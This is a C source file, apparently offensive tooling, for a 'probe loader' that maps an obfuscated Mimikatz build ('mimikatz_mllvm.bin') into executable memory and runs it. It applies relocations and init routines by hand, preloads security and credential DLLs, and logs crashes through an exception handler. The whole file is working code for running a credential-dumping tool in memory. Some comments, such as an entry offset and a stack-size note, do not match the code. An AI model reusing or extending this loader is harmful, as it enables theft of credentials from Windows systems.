/*
 * probe_loader.c —— 扁平镜像探针加载器（v3）
 *
 * 三种模式：
 *   probe_loader.exe <bin>                 走 stub（真实路径）
 *   probe_loader.exe <bin> --manual        自己做 rebase，逐个调用 .mli init
 *   probe_loader.exe <bin> --selftest      故意触发 AV，验证 VEH 是否工作
 *
 * 全部输出走 WriteFile，不依赖 CRT 的堆/流，异常上下文里也能用。
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define COMPILE_BASE 0x140001000ULL
#define MLI_OFF      0x1C0000
#define MLI_COUNT    100
#define RELOC_OFF    0x1C04AF
#define RELOC_CNT    101
#define ENTRY_OFF    0xDC640

static volatile LONG g_faulted = 0;
static unsigned long long g_base = 0, g_size = 0;
static char g_phase[96] = "startup";

static void P(const char *s)
{
    DWORD w;
    WriteFile(GetStdHandle(STD_ERROR_HANDLE), s, (DWORD)lstrlenA(s), &w, NULL);
}

static LONG CALLBACK VectoredHandler(EXCEPTION_POINTERS *ep)
{
    if (InterlockedIncrement(&g_faulted) > 8)
        return EXCEPTION_CONTINUE_SEARCH;

    CONTEXT *c = ep->ContextRecord;
    char buf[700];
    int n = wsprintfA(buf,
        "\r\n[FAULT] phase=%s code=0x%08lX addr=%p\r\n"
        "  RIP=%016I64X RSP=%016I64X RBP=%016I64X\r\n"
        "  RAX=%016I64X RCX=%016I64X RDX=%016I64X RBX=%016I64X\r\n"
        "  RSI=%016I64X RDI=%016I64X R8 =%016I64X R9 =%016I64X\r\n"
        "  R10=%016I64X R11=%016I64X R12=%016I64X R13=%016I64X\r\n"
        "  R14=%016I64X R15=%016I64X\r\n",
        g_phase,
        ep->ExceptionRecord->ExceptionCode, ep->ExceptionRecord->ExceptionAddress,
        c->Rip, c->Rsp, c->Rbp,
        c->Rax, c->Rcx, c->Rdx, c->Rbx,
        c->Rsi, c->Rdi, c->R8, c->R9,
        c->R10, c->R11, c->R12, c->R13,
        c->R14, c->R15);
    P(buf);

    if (g_base && c->Rip >= g_base && c->Rip < g_base + g_size)
        n = wsprintfA(buf, "  >>> RIP INSIDE image, flat off=0x%I64X (entry=0x%X)\r\n",
                      (unsigned long long)(c->Rip - g_base), ENTRY_OFF);
    else
        n = wsprintfA(buf, "  >>> RIP OUTSIDE image (base=%016I64X size=0x%I64X)\r\n",
                      g_base, g_size);
    P(buf);

    if (ep->ExceptionRecord->NumberParameters >= 2) {
        n = wsprintfA(buf, "  access=%s at %016I64X\r\n",
                      ep->ExceptionRecord->ExceptionInformation[0] ? "WRITE" : "READ",
                      (unsigned long long)ep->ExceptionRecord->ExceptionInformation[1]);
        P(buf);
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void *g_entry_ptr = NULL;

static DWORD WINAPI EntryThread(LPVOID p)
{
    (void)p;
    lstrcpyA(g_phase, "entry");
    P("[*] calling entry...\r\n");
    typedef int (*entry_t)(void);
    int rc = ((entry_t)g_entry_ptr)();
    char b[128];
    wsprintfA(b, "\r\n[*] entry returned %d\r\n", rc);
    P(b);
    ExitProcess((UINT)rc);
    return 0;
}

static DWORD WINAPI Watchdog(LPVOID p)
{
    (void)p;
    Sleep(45000);
    P("\r\n[ALIVE] survived 45s -> no crash\r\n");
    ExitProcess(0);
    return 0;
}

int main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1] : "x64\\mimikatz_mllvm.bin";
    int manual = 0, selftest = 0, preload = 0, i;
    for (i = 2; i < argc; i++) {
        if (!lstrcmpA(argv[i], "--manual"))   manual = 1;
        if (!lstrcmpA(argv[i], "--selftest")) selftest = 1;
        if (!lstrcmpA(argv[i], "--preload"))  preload = 1;
    }

    FILE *f = fopen(path, "rb");
    if (!f) { P("[-] cannot open\r\n"); return 1; }
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n <= 0) { fclose(f); return 1; }

    unsigned char *img = (unsigned char *)malloc((size_t)n);
    if (!img || fread(img, 1, (size_t)n, f) != (size_t)n) { fclose(f); return 1; }
    fclose(f);

    g_size = (unsigned long long)n + 0x10000;
    void *base = VirtualAlloc(NULL, (SIZE_T)g_size,
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) { P("[-] VirtualAlloc failed\r\n"); return 1; }
    memcpy(base, img, (size_t)n);
    g_base = (unsigned long long)base;

    char b[300];
    wsprintfA(b, "[*] %ld bytes, base=%p, delta=0x%I64X\r\n",
              n, base, g_base - COMPILE_BASE);
    P(b);

    AddVectoredExceptionHandler(1, VectoredHandler);

    /* 先自己解析一遍宿主命令行，确认 argv 的形状 */
    {
        int ac = 0, k;
        LPWSTR *av = CommandLineToArgvW(GetCommandLineW(), &ac);
        wsprintfA(b, "[*] host argc=%d\r\n", ac);
        P(b);
        if (av) {
            for (k = 0; k < ac && k < 8; k++) {
                char tmp[260];
                WideCharToMultiByte(CP_ACP, 0, av[k], -1, tmp, 260, NULL, NULL);
                wsprintfA(b, "    argv[%d] len=%d \"%s\"\r\n", k, lstrlenW(av[k]), tmp);
                P(b);
            }
            LocalFree(av);
        }
    }

    if (selftest) {
        lstrcpyA(g_phase, "selftest-av");
        P("[*] selftest: writing to NULL...\r\n");
        *(volatile int *)0 = 1;
        P("[!] selftest did NOT fault -> VEH broken\r\n");
        return 2;
    }

    CreateThread(NULL, 0, Watchdog, NULL, 0, NULL);

    if (preload) {
        static const char *dlls[] = {
            "msasn1.dll", "bcrypt.dll", "ncrypt.dll", "crypt32.dll", "advapi32.dll",
            "secur32.dll", "netapi32.dll", "samlib.dll", "wldap32.dll", "user32.dll",
            "wtsapi32.dll", "iphlpapi.dll", "ws2_32.dll", "psapi.dll", "version.dll",
            "oleaut32.dll", "comdlg32.dll", "gdi32.dll", "netlogon.dll", "dnsapi.dll",
            "dbghelp.dll", "cabinet.dll", "winhttp.dll", "wininet.dll", "tokenbinding.dll",
            NULL
        };
        int k;
        for (k = 0; dlls[k]; k++) {
            HMODULE hm = LoadLibraryA(dlls[k]);
            wsprintfA(b, "    preload %-16s -> %p\r\n", dlls[k], hm);
            P(b);
        }
    }

    if (manual) {
        /* ---- 手动等价于 stub：rebase + 逐个 init ---- */
        unsigned long long delta = g_base - COMPILE_BASE;
        DWORD *rel = (DWORD *)((unsigned char *)base + RELOC_OFF);
        wsprintfA(b, "[*] manual: applying %d relocations (delta=0x%I64X)\r\n",
                  RELOC_CNT, delta);
        P(b);
        lstrcpyA(g_phase, "manual-rebase");
        for (i = 0; i < RELOC_CNT; i++) {
            unsigned long long *p = (unsigned long long *)((unsigned char *)base + rel[i]);
            *p += delta;
        }
        P("[*] rebase done\r\n");

        unsigned long long *slots = (unsigned long long *)((unsigned char *)base + MLI_OFF);
        for (i = 0; i < MLI_COUNT; i++) {
            wsprintfA(g_phase, "manual-init[%d]", i);
            wsprintfA(b, "[*] init[%02d] slot=0x%I64X (flat off=0x%I64X)\r\n",
                      i, slots[i],
                      slots[i] ? (unsigned long long)(slots[i] - g_base) : 0ULL);
            P(b);
            if (slots[i]) {
                typedef void (*init_t)(void);
                ((init_t)slots[i])();
            }
        }
        P("[*] all inits returned\r\n");

        lstrcpyA(g_phase, "manual-entry");
        P("[*] calling entry (flat off 0xDA5D0)...\r\n");
        typedef int (*entry_t)(void);
        int rc = ((entry_t)((unsigned char *)base + ENTRY_OFF))();
        wsprintfA(b, "[*] entry returned %d\r\n", rc);
        P(b);
        return rc;
    }

    /* ---- 真实路径：跳镜像首字节，由 stub 接管 ---- */
    FILE *in = fopen("build\\probe_stdin.txt", "wb");
    if (in) { fputs("exit\n", in); fclose(in); }
    freopen("build\\probe_stdin.txt", "r", stdin);

    lstrcpyA(g_phase, "stub");
    P("[*] jumping to image base (stub) on a default 1MB grow-on-demand stack...\r\n");

    /* 关键：-mno-stack-arg-probe 让大栈帧函数（wmain 的 sub rsp,0x20090）
       直接跨过 guard page。用初始提交 = 8MB 的线程，页面全是已提交的，
       就不会踩到 guard page。 */
    g_entry_ptr = base;
    HANDLE h = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
    if (!h) {
        P("[-] CreateThread failed, falling back to main thread\r\n");
        typedef int (*entry_t)(void);
        int rc = ((entry_t)base)();
        wsprintfA(b, "\r\n[*] entry returned %d\r\n", rc);
        P(b);
        return rc;
    }
    WaitForSingleObject(h, INFINITE);
    return 0;
}
